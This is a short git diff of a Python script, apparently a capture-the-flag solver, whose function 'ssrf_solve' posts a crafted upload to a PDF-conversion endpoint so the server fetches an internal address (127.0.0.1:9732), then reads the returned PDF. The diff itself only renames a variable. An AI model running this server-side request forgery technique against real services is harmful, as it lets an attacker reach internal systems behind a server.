@@ -3,7 +3,7 @@ import re
 import requests
 from pypdf import PdfReader
 
-URL = "http://utils.edu.stf/convert.php"
+Target = "http://utils.edu.stf/convert.php"
 Payload = "http://127.0.0.1:9732"
 
 def ssrf_solve():
@@ -15,7 +15,7 @@ def ssrf_solve():
     try:
 
         response = requests.post(
-                URL, files=from_data, timeout=10
+                Target, files=from_data, timeout=10
             )
         if response.status_code == 200:
             pdf_file = io.BytesIO(response.content)
